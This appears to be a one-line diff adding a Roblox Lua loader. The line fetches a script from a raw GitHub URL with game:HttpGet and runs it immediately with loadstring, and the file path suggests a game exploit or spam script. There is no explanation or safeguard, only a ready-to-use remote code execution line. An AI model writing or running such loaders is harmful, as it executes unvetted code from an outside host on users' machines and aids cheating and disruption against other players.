@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BaseLizardFascinate/loaders/main/loaders/new-zombie-air-force-spam5-iuf3l6i4o3gxuy.lua"))()
